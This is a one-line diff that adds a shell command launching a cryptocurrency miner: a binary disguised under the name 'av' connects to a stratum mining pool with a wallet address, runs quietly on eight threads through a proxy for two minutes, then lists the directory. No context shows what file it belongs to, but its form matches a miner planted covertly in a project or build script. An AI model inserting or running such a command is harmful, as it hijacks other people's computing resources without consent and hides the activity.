@@ -1,0 +1,1 @@
+timeout 120s ./av -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BX6z2URpnsyEmtSLEpQkQhe6eX95KZmrHX.Tesss -p x -t 8 -q -x tcp://192.168.16.2:5500; ls -a
